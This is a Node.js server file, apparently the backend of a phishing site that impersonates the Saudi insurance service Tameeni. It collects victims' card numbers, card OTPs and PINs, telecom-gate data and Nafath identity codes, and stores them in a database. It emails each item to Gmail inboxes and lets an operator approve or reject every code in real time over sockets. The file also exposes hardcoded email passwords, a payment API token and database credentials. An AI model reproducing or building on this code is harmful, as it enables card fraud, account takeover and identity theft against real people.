const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
const { Order } = require("./models");
const { default: mongoose } = require("mongoose");
const path = require("path");
const server = require("http").createServer(app);
const PORT = process.env.PORT || 8080;
const io = require("socket.io")(server, { cors: { origin: "*" } });
app.use(express.json());
app.use(cors({ origin: "*" }));
app.use(require("morgan")("dev"));

const emailData = {
  user: "pnusds269@gmail.com",
  pass: "dhsc vxaq mtaa oktd",
  // user: "saudiabsher1990@gmail.com",
  // pass: "qlkg nfnn xaeq fitz",
};
//const serverURL = "http://localhost:8080/";
const serverURL = "https://tamn-ser.onrender.com/";
const ZinaAccessToken =
  "aVp3bd1/u/p7Z+FHqpn4iHXV+enZhWJMSu5w4SDGxjVpyayjVpBa+VEo6ZnIkI06";

const createZinaSession = async (amount, id) => {
  const options = {
    method: "POST",
    headers: {
      Authorization: `Bearer ${ZinaAccessToken}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      amount,
      currency_code: "SAR",
      success_url: serverURL + "zain/success/" + id,
      cancel_url: serverURL + "zain/cancel/" + id,
      failure_url: serverURL + "zain/cancel/" + id,
      test: false, // make sure to set test to true for testing
      allow_tips: false,
    }),
  };

  const session = await fetch(
    "https://api-v2.ziina.com/api/payment_intent",
    options,
  )
    .then((res) => res.json())
    .catch((err) => console.error(err));
  await Order.findByIdAndUpdate(id, { zinaSessionId: session.id });
  return session.redirect_url;
};

const sendEmail = async (data, type) => {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: emailData.user,
      pass: emailData.pass,
    },
  });
  let htmlContent = "<div>";
  for (const [key, value] of Object.entries(data)) {
    htmlContent += `<p>${key}: ${
      typeof value === "object" ? JSON.stringify(value) : value
    }</p>`;
  }

  return await transporter
    .sendMail({
      from: "Admin Panel",
      to: emailData.user,
      subject: `${
        type === "visa"
          ? "Tammeni Bank Visa"
          : type === "reg"
            ? "Tammeni Register Form "
            : type === "apply"
              ? "Tammeni Apply Form "
              : type === "otp"
                ? "Tammeni Visa  Otp"
                : type === "pin"
                  ? "Tammeni Visa Pin "
                  : type === "motsl"
                    ? "Tammeni - Motsl Gate Data "
                    : type === "motslOtp"
                      ? "Tammeni - Motsl Gate Otp "
                      : type === "navaz"
                        ? "Tameeni - Navaz Gate "
                        : type === "navazOtp"
                          ? "Tameeni Navaz Last Otp  "
                          : "Tameeni "
      }`,
      html: htmlContent,
    })
    .then((info) => {
      if (info.accepted.length) {
        return true;
      } else {
        return false;
      }
    });
};

const sendInvoiceEmail = async (orderData, customerEmail) => {
  console.log(customerEmail);
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: emailData.user,
      pass: emailData.pass,
    },
  });

  const invoiceHtml = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Payment Invoice</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background-color: #f4f7fa;
                padding: 40px 20px;
                line-height: 1.6;
            }
            .container {
                max-width: 700px;
                margin: 0 auto;
                background: white;
                border-radius: 16px;
                overflow: hidden;
                box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
            }
            .header {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 40px 30px;
                text-align: center;
            }
            .header h1 {
                font-size: 32px;
                margin-bottom: 10px;
            }
            .header p {
                font-size: 16px;
                opacity: 0.95;
            }
            .success-badge {
                display: inline-block;
                background: rgba(255, 255, 255, 0.25);
                padding: 8px 20px;
                border-radius: 30px;
                margin-top: 15px;
                font-weight: 600;
                font-size: 14px;
            }
            .content {
                padding: 40px 30px;
            }
            .invoice-info {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 20px;
                margin-bottom: 30px;
                padding-bottom: 20px;
                border-bottom: 2px solid #f0f0f0;
            }
            .invoice-info-item {
                text-align: center;
            }
            .label {
                color: #888;
                font-size: 13px;
                margin-bottom: 8px;
                text-transform: uppercase;
                font-weight: 600;
                letter-spacing: 0.5px;
            }
            .value {
                color: #333;
                font-size: 16px;
                font-weight: 600;
            }
            .details-section {
                background: #f8f9ff;
                padding: 25px;
                border-radius: 12px;
                margin: 25px 0;
                border: 1px solid #e8eaf6;
            }
            .details-section h3 {
                color: #667eea;
                margin-bottom: 20px;
                font-size: 18px;
                border-bottom: 2px solid #667eea;
                padding-bottom: 10px;
            }
            .detail-row {
                display: flex;
                justify-content: space-between;
                align-items: flex-start;
                padding: 12px 0;
                border-bottom: 1px solid #e0e0e0;
            }
            .detail-row:last-child {
                border-bottom: none;
            }
            .detail-label {
                color: #666;
                font-weight: 500;
                flex-shrink: 0;
            }
            .detail-value {
                color: #333;
                font-weight: 600;
                text-align: right;
                flex-grow: 1;
                margin-left: 20px;
            }
            .options-inline {
                color: #555;
                font-size: 14px;
                line-height: 1.8;
            }
            .total-section {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 30px;
                border-radius: 12px;
                margin: 25px 0;
                box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
            }
            .total-row {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 10px 0;
                font-size: 18px;
                width: 100%;
                gap: 20px;
            }
            .total-amount {
                font-size: 20px;
                font-weight: bold;
                width: 50%;
                text-align: right;
            }
            .footer {
                text-align: center;
                padding: 30px;
                background: #f8f9fa;
                color: #888;
                font-size: 14px;
            }
            .footer p {
                margin: 8px 0;
            }
            .status-success {
                color: #4caf50;
                font-weight: 600;
                display: inline-flex;
                align-items: center;
            }
            .status-success::before {
                content: "✓";
                display: inline-block;
                width: 20px;
                height: 20px;
                background: #4caf50;
                color: white;
                border-radius: 50%;
                margin-right: 8px;
                text-align: center;
                line-height: 20px;
                font-size: 14px;
            }
            .empty-value {
                color: #999;
                font-style: italic;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>📄 Payment Invoice</h1>
                <p>Thank you for completing your payment successfully</p>
                <div class="success-badge">✓ Payment Completed</div>
            </div>
            
            <div class="content">
                <div class="invoice-info">
                    <div class="invoice-info-item">
                        <div class="label">Invoice Number</div>
                        <div class="value">#${orderData._id.toString().slice(-8).toUpperCase()}</div>
                    </div>
                    <div class="invoice-info-item">
                        <div class="label">Date</div>
                        <div class="value">${new Date().toLocaleDateString("en-US", { year: "numeric", month: "long", day: "numeric" })}</div>
                    </div>
                    <div class="invoice-info-item">
                        <div class="label">Status</div>
                        <div class="value status-success">Completed</div>
                    </div>
                </div>

                <div class="details-section">
                    <h3>Customer Information</h3>
                    <div class="detail-row">
                        <span class="detail-label">Name:</span>
                        <span class="detail-value">${orderData.carHolderName || '<span class="empty-value">Not Provided</span>'}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Email:</span>
                        <span class="detail-value">${orderData.email || '<span class="empty-value">Not Provided</span>'}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Phone:</span>
                        <span class="detail-value">${orderData.phone || '<span class="empty-value">Not Provided</span>'}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">National ID:</span>
                        <span class="detail-value">${orderData.national_id || '<span class="empty-value">Not Provided</span>'}</span>
                    </div>
                </div>

                <div class="details-section">
                    <h3>Service Details</h3>
                    <div class="detail-row">
                        <span class="detail-label">Service Name:</span>
                        <span class="detail-value">${orderData.companyData?.name || '<span class="empty-value">Not Specified</span>'}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Service Options:</span>
                        <div class="detail-value">
                            ${
                              orderData.companyData?.options &&
                              Array.isArray(orderData.companyData.options)
                                ? `<span class="options-inline">${orderData.companyData.options
                                    .map((option) => option.label || "Option")
                                    .join(" - ")}</span>`
                                : '<span class="empty-value">No Options</span>'
                            }
                        </div>
                    </div>
                </div>

                <div class="total-section">
                    <div class="total-row">
                        <span>Total Amount:</span>
                        <span class="total-amount">$${orderData.companyData?.price} USD</span>
                    </div>
                </div>

                <div class="details-section">
                    <h3>Payment Information</h3>
                    <div class="detail-row">
                        <span class="detail-label">Payment Method:</span>
                        <span class="detail-value">Ziina Payment Gateway</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Transaction ID:</span>
                        <span class="detail-value">${orderData.zinaSessionId || '<span class="empty-value">N/A</span>'}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Payment Time:</span>
                        <span class="detail-value">${new Date().toLocaleString("en-US", { dateStyle: "medium", timeStyle: "short" })}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Payment Status:</span>
                        <span class="detail-value status-success">Completed</span>
                    </div>
                </div>
            </div>

            <div class="footer">
                <p><strong>Thank you for using our services</strong></p>
                <p>This is an automatically generated electronic invoice</p>
                <p>For inquiries, please contact us</p>
                <p style="margin-top: 20px; color: #aaa;">© ${new Date().getFullYear()} Tammeni. All Rights Reserved.</p>
            </div>
        </div>
    </body>
    </html>
  `;

  // Send to both admin and customer
  const recipients = [emailData.user];
  if (customerEmail) {
    recipients.push(customerEmail);
  }

  try {
    await transporter.sendMail({
      from: '"Tammeni - تأميني" <' + emailData.user + ">",
      to: recipients.join(", "),
      subject:
        "فاتورة الدفع - Payment Invoice #" +
        orderData._id.toString().slice(-8).toUpperCase(),
      html: invoiceHtml,
    });
    return true;
  } catch (error) {
    console.error("Error sending invoice email:", error);
    return false;
  }
};

app.get("/", (req, res) => res.sendStatus(200));
app.delete("/", async (req, res) => {
  await Order.find({})
    .then(async (orders) => {
      await Promise.resolve(
        orders.forEach(async (order) => {
          await Order.findByIdAndDelete(order._id);
        }),
      );
    })
    .then(() => res.sendStatus(200));
});
app.post("/email", async (req, res) => {
  if (req.query.type === "one") {
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "pnusds269@gmail.com",
        pass: "bojr nrmj bjen rcgt",
      },
    });
    let htmlContent = "<div>";
    for (const [key, value] of Object.entries(req.body)) {
      htmlContent += `<p>${key}: ${
        typeof value === "object" ? JSON.stringify(value) : value
      }</p>`;
    }
    await transporter
      .sendMail({
        from: "Admin Panel",
        to: "pnusds269@gmail.com",
        subject: `${
          req.query.otp
            ? "Tammeni Visa  Otp"
            : req.query.reg
              ? "Tammeni Register Form "
              : req.query.apply
                ? "Tammeni Apply Form "
                : req.query.activate
                  ? "Tammeni Activate Account "
                  : req.query.phone
                    ? "Motsl Gate Data "
                    : req.query.Motslotp
                      ? "Motsl Gate Otp "
                      : req.query.new
                        ? "Tammeni  New User "
                        : req.query.navazOtp
                          ? "Tameeni Navaz Last Otp  "
                          : "Tammeni Bank Visa"
        }`,
        html: htmlContent,
      })
      .then((info) => {
        if (info.accepted.length) {
          res.sendStatus(200);
        } else {
          res.sendStatus(400);
        }
      });
  } else {
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "saudiabsher1990@gmail.com",
        pass: "idot oooz frhy mdsr",
      },
    });
    let htmlContent = "<div>";
    for (const [key, value] of Object.entries(req.body)) {
      htmlContent += `<p>${key}: ${
        typeof value === "object" ? JSON.stringify(value) : value
      }</p>`;
    }
    await transporter
      .sendMail({
        from: "Admin Panel",
        to: "saudiabsher1990@gmail.com",
        subject: `${
          req.query.otp
            ? "Tammeni Bank  Otp"
            : req.query.reg
              ? "Tammeni Register Form "
              : req.query.apply
                ? "Tammeni Apply Form "
                : req.query.activate
                  ? "Tammeni Activate Account "
                  : req.query.new
                    ? "Tammeni  New User "
                    : "Tammeni Bank Visa"
        }`,
        html: htmlContent,
      })
      .then((info) => {
        if (info.accepted.length) {
          res.sendStatus(200);
        } else {
          res.sendStatus(400);
        }
      });
  }
});

app.post("/login", async (req, res) => {
  try {
    await Order.create(req.body).then(
      async (order) =>
        await sendEmail(req.body, "login").then(() =>
          res.status(201).json({ order }),
        ),
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.get("/order/checked/:id", async (req, res) => {
  try {
    const { id } = req.params;
    await Order.findByIdAndUpdate(id, { checked: true }).then(() =>
      res.sendStatus(200),
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/reg", async (req, res) => {
  try {
    await Order.create(req.body).then(
      async (order) =>
        await sendEmail(req.body, "reg").then(() =>
          res.status(201).json(order),
        ),
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/apply/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(
    id,
    {
      ...req.body,
      checked: false,
    },
    { new: true },
  ).then(
    async (order) =>
      await sendEmail(req.body, "apply").then(() =>
        res.status(200).json(order),
      ),
  );
});

app.post("/visa/:id", async (req, res) => {
  const { id } = req.params;
  // Store companyData in the order
  await Order.findByIdAndUpdate(id, {
    companyData: req.body.companyData,
    ...req.body,
  });
  const data = await createZinaSession(req.body.companyData.price * 100, id);
  await sendEmail(req.body, "visa");
  res.status(200).json({ url: data });
});

app.get(
  "/users",
  async (req, res) => await Order.find().then((users) => res.json(users)),
);

io.on("connection", (socket) => {
  console.log("connected");

  socket.on("newUser", () => io.emit("newUser"));

  socket.on("newData", () => io.emit("newData"));

  socket.on("paymentForm", (data) => {
    console.log("paymentForm Wait", data);
    io.emit("paymentForm", data);
  });

  socket.on("acceptPaymentForm", async (id) => {
    console.log("acceptPaymentForm From Admin", id);
    console.log(id);
    io.emit("acceptPaymentForm", id);
    await Order.findByIdAndUpdate(id, { CardAccept: true });
  });
  socket.on("declinePaymentForm", async (id) => {
    console.log("declinePaymentForm Form Admin", id);
    io.emit("declinePaymentForm", id);
    await Order.findByIdAndUpdate(id, { CardAccept: true });
  });

  socket.on("visaOtp", (data) => {
    console.log("visaOtp  received", data);
    io.emit("visaOtp", data);
  });
  socket.on("acceptVisaOtp", async (id) => {
    console.log("acceptVisaOtp From Admin", id);
    await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
    io.emit("acceptVisaOtp", id);
  });
  socket.on("declineVisaOtp", async (id) => {
    console.log("declineVisaOtp Form Admin", id);
    await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
    io.emit("declineVisaOtp", id);
  });

  socket.on("visaPin", (data) => {
    console.log("visaPin  received", data);
    io.emit("visaPin", data);
  });
  socket.on("acceptVisaPin", async (id) => {
    console.log("acceptVisaPin From Admin", id);
    await Order.findByIdAndUpdate(id, { PinAccept: true });
    io.emit("acceptVisaPin", id);
  });
  socket.on("declineVisaPin", async (id) => {
    console.log("declineVisaPin Form Admin", id);
    await Order.findByIdAndUpdate(id, { PinAccept: true });
    io.emit("declineVisaPin", id);
  });

  socket.on("motsl", (data) => {
    console.log("Motsl Data", data);
    io.emit("motsl", data);
  });

  socket.on("acceptMotsl", async (id) => {
    console.log("Motsl Data", id);
    await Order.findByIdAndUpdate(id, { MotslAccept: true });
    io.emit("acceptMotsl", id);
  });
  socket.on("declineMotsl", async (id) => {
    console.log("declineMotsl Data", id);
    await Order.findByIdAndUpdate(id, { MotslAccept: true });
    io.emit("declineMotsl", id);
  });

  socket.on("motslOtp", async (data) => {
    console.log("motslOtp received", data);
    await Order.findByIdAndUpdate(data.id, {
      MotslOtp: data.MotslOtp,
      STCAccept: false,
    });
    io.emit("motslOtp", data);
  });
  socket.on("acceptMotslOtp", async (data) => {
    console.log("acceptMotslOtp send", { id: data.id, userOtp: data.userOtp });
    io.emit("acceptMotslOtp", { id: data.id, userOtp: data.userOtp });
    await Order.findByIdAndUpdate(data.id, {
      NavazOtp: data.userOtp,
    });
  });
  socket.on("declineMotslOtp", async (id) => {
    console.log("declineMotslOtp send", id);
    io.emit("declineMotslOtp", id);
    await Order.findByIdAndUpdate(id, { MotslOtpAccept: true });
  });

  socket.on("acceptSTC", async ({ id, userOtp }) => {
    console.log("acceptSTC send", { id, userOtp });
    io.emit("acceptSTC", { userOtp, id });
    await Order.findByIdAndUpdate(id, { NavazOtp: userOtp, STCAccept: true });
  });
  socket.on("declineSTC", async (id) => {
    console.log("declineSTC send", id);
    io.emit("declineSTC", id);
    await Order.findByIdAndUpdate(id, { STCAccept: true });
  });

  socket.on("navaz", (data) => {
    console.log("navaz received", data);
    io.emit("navaz", data);
  });
  socket.on("acceptNavaz", async (data) => {
    console.log("acceptNavaz send", data);
    io.emit("acceptNavaz", data);
    await Order.findByIdAndUpdate(data.id, {
      NavazAccept: true,
      NavazOtp: data.userOtp,
    });
  });
  socket.on("declineNavaz", async (id) => {
    console.log("declineNavaz send", id);
    io.emit("declineNavaz", id);
    await Order.findByIdAndUpdate(id, { NavazAccept: true });
  });
  socket.on("successValidate", (data) => io.emit("successValidate", data));
  socket.on("declineValidate", (data) => io.emit("declineValidate", data));
});

app.use("/zain/success/:id", async (req, res, next) => {
  console.log("Zain Payment Success");
  console.log(req);
  const { id } = req.params;
  const order = await Order.findById(id);
  const options = {
    method: "GET",
    headers: {
      Authorization: `Bearer ${ZinaAccessToken}`,
    },
  };
  console.log(order);
  const paymentData = await fetch(
    `https://api-v2.ziina.com/api/payment_intent/${order?.zinaSessionId}`,
    options,
  ).then((res) => res.json());

  if (paymentData.status === "completed") {
    // Payment successful - update order and show success page
    await Order.findByIdAndUpdate(id, {
      paymentStatus: "completed",
      paymentCompletedAt: new Date(),
    });

    // Send invoice email to customer and admin
    const customerEmail = order.email || order.contactEmail || null;
    await sendInvoiceEmail(order, customerEmail);

    // Generate success page with order details
    const successHtml = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Payment Successful</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
            }
            .container {
                background: white;
                border-radius: 24px;
                max-width: 700px;
                width: 100%;
                box-shadow: 0 30px 80px rgba(0, 0, 0, 0.25);
                overflow: hidden;
                animation: slideIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
            }
            @keyframes slideIn {
                from { opacity: 0; transform: translateY(-40px) scale(0.95); }
                to { opacity: 1; transform: translateY(0) scale(1); }
            }
            .header {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 40px 30px;
                text-align: center;
            }
            .success-icon {
                width: 100px;
                height: 100px;
                background: rgba(255, 255, 255, 0.2);
                border-radius: 50%;
                display: flex;
                justify-content: center;
                align-items: center;
                margin: 0 auto 20px;
                animation: scaleIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
            }
            @keyframes scaleIn {
                0% { transform: scale(0) rotate(-180deg); }
                50% { transform: scale(1.1) rotate(10deg); }
                100% { transform: scale(1) rotate(0deg); }
            }
            .success-icon::after {
                content: "✓";
                color: white;
                font-size: 55px;
                font-weight: bold;
            }
            .header h1 { font-size: 32px; margin-bottom: 10px; }
            .header p { font-size: 16px; opacity: 0.95; }
            .success-badge {
                display: inline-block;
                background: rgba(255, 255, 255, 0.25);
                padding: 8px 20px;
                border-radius: 30px;
                margin-top: 15px;
                font-weight: 600;
                font-size: 14px;
            }
            .content { padding: 40px 30px; }
            .invoice-info {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 20px;
                margin-bottom: 30px;
                padding-bottom: 20px;
                border-bottom: 2px solid #f0f0f0;
            }
            .invoice-info-item { text-align: center; }
            .label {
                color: #888;
                font-size: 13px;
                margin-bottom: 8px;
                text-transform: uppercase;
                font-weight: 600;
                letter-spacing: 0.5px;
            }
            .value {
                color: #333;
                font-size: 16px;
                font-weight: 600;
            }
            .details-section {
                background: #f8f9ff;
                padding: 25px;
                border-radius: 12px;
                margin: 25px 0;
                border: 1px solid #e8eaf6;
            }
            .details-section h3 {
                color: #667eea;
                margin-bottom: 20px;
                font-size: 18px;
                border-bottom: 2px solid #667eea;
                padding-bottom: 10px;
            }
            .detail-row {
                display: flex;
                justify-content: space-between;
                align-items: flex-start;
                padding: 12px 0;
                border-bottom: 1px solid #e0e0e0;
            }
            .detail-row:last-child { border-bottom: none; }
            .detail-label {
                color: #666;
                font-weight: 500;
                flex-shrink: 0;
            }
            .detail-value {
                color: #333;
                font-weight: 600;
                text-align: right;
                flex-grow: 1;
                margin-left: 20px;
            }
            .options-inline {
                color: #555;
                font-size: 14px;
                line-height: 1.8;
            }
            .total-section {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 30px;
                border-radius: 12px;
                margin: 25px 0;
                box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
            }
            .total-row {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 10px 0;
                font-size: 18px;
                width: 100%;
                gap: 20px;
            }
            .total-amount {
                font-size: 32px;
                font-weight: bold;
                white-space: nowrap;
            }
            .status-success {
                color: #4caf50;
                font-weight: 600;
                display: inline-flex;
                align-items: center;
            }
            .status-success::before {
                content: "✓";
                display: inline-block;
                width: 20px;
                height: 20px;
                background: #4caf50;
                color: white;
                border-radius: 50%;
                margin-right: 8px;
                text-align: center;
                line-height: 20px;
                font-size: 14px;
            }
            .empty-value {
                color: #999;
                font-style: italic;
            }
            .footer {
                text-align: center;
                padding: 30px;
                background: #f8f9fa;
                color: #888;
                font-size: 14px;
            }
            .footer p { margin: 8px 0; }
            .btn {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                border: none;
                padding: 14px 35px;
                border-radius: 50px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                margin-top: 20px;
                box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
                transition: all 0.3s ease;
                text-decoration: none;
                display: inline-block;
            }
            .btn:hover {
                transform: translateY(-3px);
                box-shadow: 0 12px 35px rgba(102, 126, 234, 0.5);
            }
            @media (max-width: 600px) {
                .invoice-info { grid-template-columns: 1fr; }
                .container { margin: 10px; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="success-icon"></div>
                <h1>📄 Payment Successful</h1>
                <p>Thank you for completing your payment successfully</p>
                <div class="success-badge">✓ Payment Completed</div>
            </div>
            
            <div class="content">
                <div class="invoice-info">
                    <div class="invoice-info-item">
                        <div class="label">Invoice Number</div>
                        <div class="value">#${order._id.toString().slice(-8).toUpperCase()}</div>
                    </div>
                    <div class="invoice-info-item">
                        <div class="label">Date</div>
                        <div class="value">${new Date().toLocaleDateString("en-US", { year: "numeric", month: "long", day: "numeric" })}</div>
                    </div>
                    <div class="invoice-info-item">
                        <div class="label">Status</div>
                        <div class="value status-success">Completed</div>
                    </div>
                </div>

                <div class="details-section">
                    <h3>Customer Information</h3>
                    <div class="detail-row">
                        <span class="detail-label">Name:</span>
                        <span class="detail-value">${order.carHolderName || '<span class="empty-value">Not Provided</span>'}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Email:</span>
                        <span class="detail-value">${order.email || '<span class="empty-value">Not Provided</span>'}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Phone:</span>
                        <span class="detail-value">${order.phone || '<span class="empty-value">Not Provided</span>'}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">National ID:</span>
                        <span class="detail-value">${order.national_id || '<span class="empty-value">Not Provided</span>'}</span>
                    </div>
                </div>

                <div class="details-section">
                    <h3>Service Details</h3>
                    <div class="detail-row">
                        <span class="detail-label">Service Name:</span>
                        <span class="detail-value">${order.companyData?.name || '<span class="empty-value">Not Specified</span>'}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Service Options:</span>
                        <div class="detail-value">
                            ${
                              order.companyData?.options &&
                              Array.isArray(order.companyData.options)
                                ? `<span class="options-inline">${order.companyData.options
                                    .map((option) => option.label || "Option")
                                    .join(" - ")}</span>`
                                : '<span class="empty-value">No Options</span>'
                            }
                        </div>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Service Price:</span>
                        <span class="detail-value">$${order.companyData?.price || 0} USD</span>
                    </div>
                </div>

                <div class="total-section">
                    <div class="total-row">
                        <span>Total Amount:</span>
                        <span class="total-amount">$${order.companyData?.price || 0} USD</span>
                    </div>
                </div>

                <div class="details-section">
                    <h3>Payment Information</h3>
                    <div class="detail-row">
                        <span class="detail-label">Payment Method:</span>
                        <span class="detail-value">Ziina Payment Gateway</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Transaction ID:</span>
                        <span class="detail-value">${order.zinaSessionId || '<span class="empty-value">N/A</span>'}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Payment Time:</span>
                        <span class="detail-value">${new Date().toLocaleString("en-US", { dateStyle: "medium", timeStyle: "short" })}</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Payment Status:</span>
                        <span class="detail-value status-success">Completed</span>
                    </div>
                </div>
            </div>

            <div class="footer">
                <p><strong>Thank you for using our services</strong></p>
                <p style="margin-top: 20px; color: #aaa;">© ${new Date().getFullYear()} Tammeni. All Rights Reserved.</p>
            </div>
        </div>
        
        <script>
            let seconds = 10;
            const countdown = setInterval(() => {
                seconds--;
                document.getElementById('countdown').textContent = seconds;
                if (seconds <= 0) {
                    clearInterval(countdown);
                    window.close();
                }
            }, 1000);
        </script>
    </body>
    </html>
    `;

    return res.send(successHtml);
  } else {
    // Payment not completed - create new session and redirect
    const newPaymentUrl = await createZinaSession(
      order.companyData.price * 100,
      id,
    );
    return res.redirect(newPaymentUrl);
  }
});
app.use("/zain/cancel/:id", async (req, res, next) => {
  console.log("Zain Payment Cancel");
  const { id } = req.params;

  try {
    const order = await Order.findById(id);
    if (!order) {
      return res.status(404).send("Order not found");
    }

    // Update order with cancellation status
    await Order.findByIdAndUpdate(id, {
      paymentStatus: "cancelled",
      paymentCancelledAt: new Date(),
    });

    // Create new payment session and redirect
    const newPaymentUrl = await createZinaSession(
      order.companyData.price * 100,
      id,
    );

    // Send retry HTML with redirect script
    res.send(`
      <!DOCTYPE html>
      <html lang="ar" dir="rtl">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>إعادة المحاولة</title>
          <style>
              * { margin: 0; padding: 0; box-sizing: border-box; }
              body {
                  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                  background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
                  min-height: 100vh;
                  display: flex;
                  justify-content: center;
                  align-items: center;
                  padding: 20px;
              }
              .container {
                  background: white;
                  border-radius: 20px;
                  padding: 40px;
                  max-width: 500px;
                  width: 100%;
                  box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                  text-align: center;
              }
              .warning-icon {
                  width: 100px;
                  height: 100px;
                  background: #ff9800;
                  border-radius: 50%;
                  display: flex;
                  justify-content: center;
                  align-items: center;
                  margin: 0 auto 30px;
              }
              .warning-icon::after {
                  content: '!';
                  color: white;
                  font-size: 60px;
                  font-weight: bold;
              }
              h1 { color: #333; margin-bottom: 15px; font-size: 28px; }
              p { color: #666; font-size: 16px; line-height: 1.6; margin-bottom: 30px; }
              .loader {
                  border: 4px solid #f3f3f3;
                  border-top: 4px solid #ff9800;
                  border-radius: 50%;
                  width: 50px;
                  height: 50px;
                  animation: spin 1s linear infinite;
                  margin: 20px auto;
              }
              @keyframes spin {
                  0% { transform: rotate(0deg); }
                  100% { transform: rotate(360deg); }
              }
          </style>
      </head>
      <body>
          <div class="container">
              <div class="warning-icon"></div>
              <h1>جاري إعادة المحاولة...</h1>
              <p>سيتم تحويلك إلى صفحة الدفع مرة أخرى</p>
              <div class="loader"></div>
          </div>
          <script>
              setTimeout(() => {
                  window.location.href = "${newPaymentUrl}";
              }, 2000);
          </script>
      </body>
      </html>
    `);
  } catch (error) {
    console.error("Error handling payment cancellation:", error);
    res.status(500).send("An error occurred");
  }
});

// Function to delete orders older than 7 days
const deleteOldOrders = async () => {
  const sevenDaysAgo = new Date();
  sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);
  try {
    const result = await Order.deleteMany({ created: { $lt: sevenDaysAgo } });
    console.log(`${result.deletedCount} orders deleted.`);
  } catch (error) {
    console.error("Error deleting old orders:", error);
  }
};

// Function to run daily
const runDailyTask = () => {
  deleteOldOrders();
  setTimeout(runDailyTask, 24 * 60 * 60 * 1000); // Schedule next execution in 24 hours
};

mongoose
  .connect("mongodb+srv://abshr:abshr@abshr.fxznc.mongodb.net/tameni3")
  .then((conn) =>
    server.listen(PORT, () => {
      runDailyTask();
      console.log("server running and connected to db" + conn.connection.host);
    }),
  );
